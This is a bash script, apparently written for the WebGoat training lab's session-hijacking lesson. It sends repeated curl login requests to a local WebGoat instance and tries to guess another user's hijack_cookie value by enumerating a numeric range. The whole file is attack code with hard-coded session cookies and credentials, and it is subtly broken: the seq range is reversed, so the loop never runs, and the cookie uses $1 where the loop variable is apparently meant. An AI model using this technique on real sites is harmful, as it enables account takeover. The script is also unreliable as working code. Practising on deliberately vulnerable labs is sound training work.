#! /bin/bash

for i in $(seq 1715838208261 1715838028283); do
  curl -v -X POST \
    http://192.168.1.6:8080/WebGoat/HijackSession/login \
    -H "Accept: */*" \
    -H "Accept-Encoding: gzip, deflate" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Connection: keep-alive" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
    -H "Cookie: JSESSIONID=q2Z2RILn2b1UgpoS5rNbEoWsm7T-BlF591MhtbPL, hijack_cookie=6976623238240218919-"$1"" \
    -H "Host: 192.168.1.6:8080" \
    -H "Origin: http://192.168.1.6:8080" \
    -H "Referer: http://192.168.1.6:8080/WebGoat/start.mvc?username=lcylcy" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
    -H "X-Requested-With: XMLHttpRequest" \
    --data "username=lcylcy&password=lcylcy123"
done
